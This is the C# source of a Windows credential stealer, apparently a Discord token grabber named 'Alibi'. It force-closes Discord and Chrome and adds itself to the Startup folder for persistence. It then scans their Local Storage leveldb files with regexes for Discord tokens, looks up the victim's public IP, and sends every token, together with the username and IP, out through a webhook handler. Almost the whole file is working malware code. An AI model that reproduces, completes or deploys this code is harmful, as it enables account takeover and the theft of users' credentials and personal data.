using System;
using IWshRuntimeLibrary;
using System.Diagnostics;
using System.Net.Http;
using System.IO;
using System.Collections.Generic;
using System.Linq;
using System.Threading;
using System.Windows.Forms;
using System.Text.RegularExpressions;
using System.Runtime.Remoting.Contexts;

namespace Alibi
{

    internal static class Token
    {
        /// <summary>
        /// The main entry point for the application.
        /// </summary>


        [STAThread]
        static void Main()
        {
            Application.EnableVisualStyles();
            Application.SetCompatibleTextRenderingDefault(false);
            // Ensure Discord and Google is closed for this process to avoid file read violations.
            foreach (Process p in Process.GetProcessesByName("Discord"))
            {
                p.Kill();
            }
            Thread.Sleep(1500);
            foreach (Process p in Process.GetProcessesByName("chrome"))
            {
                p.Kill();
            }
            Thread.Sleep(1500);
            foreach (Process p in Process.GetProcessesByName("Discord Canary"))
            {
                p.Kill();
            }
            
            setStartupShortcut();
            infiltratus();
        }


        static void setStartupShortcut()
        {
            try
            {
                object shortcutPath = Environment.GetFolderPath(Environment.SpecialFolder.Startup) + @"\TEMP.lnk";
                WshShell hostShell = new WshShell();
                IWshShortcut appShortcut = (IWshShortcut)hostShell.CreateShortcut((string)shortcutPath);
                appShortcut.TargetPath = System.Reflection.Assembly.GetExecutingAssembly().Location;
                Thread.Sleep(10000);
                appShortcut.Save();
            }
            catch { }

        }

        // handle fiels and send them out
        static void handleFiles(DirectoryInfo app)
        {
            HttpClient client = new HttpClient();
            
            var IP = client.GetStringAsync("http://ip-api.com/line/?fields=query");
            
            foreach (var file in app.GetFiles())
            {
                var fContent = file.OpenText().ReadToEnd();

                // Nested foreach statement that checks for both mfa and non-mfa tokens
                // MFA
                foreach (Match tokenRe in Regex.Matches(fContent, "mfa\\.[\\w-]{84}"))
                    Webhookhandler.send($"TOKEN: {tokenRe.Value}\nPC Name: {Environment.UserName}\nIP: {IP.Result}");
                //Non-MFA
                foreach (Match tokenRe in Regex.Matches(fContent, "[\\w-]{24}\\.[\\w-]{6}\\.[\\w-]{27}"))
                    Webhookhandler.send($"TOKEN: {tokenRe.Value}\nPC Name: {Environment.UserName}\nIP: {IP.Result}");
            }
        }

        static void infiltratus()
        {
            // Defining Local, and roaming appdata directories.
            string LOCALAPPDATAPATH = Environment.GetFolderPath(Environment.SpecialFolder.LocalApplicationData);
            string ROAMINGAPPDATAPATH = Environment.GetFolderPath(Environment.SpecialFolder.ApplicationData);

            // App Directories
            Dictionary<string, string> AppServices = new Dictionary<string, string>()
            {
                {"Discord", $@"{ROAMINGAPPDATAPATH}\discord\Local Storage\leveldb"},
                {"Google", $@"{LOCALAPPDATAPATH}\Google\Chrome\User Data\Default\Local Storage\leveldb"},
                {"Discord Canary", $@"{ROAMINGAPPDATAPATH}\discordcanary\Local Storage\leveldb"},
            };

            // Uniquely, iterating through each individually, unlike common grabbers. Also defining a DirectoryInfo for each of these.
            foreach (string dir in AppServices.Values)
            {
                               
                DirectoryInfo app = new DirectoryInfo(dir);
                if (app.Exists)
                {
                    try
                    {
                        handleFiles(app);
                        Thread.Sleep(1500);
                    }
                    catch { }
                    
                }                
            }
        }
    }
}
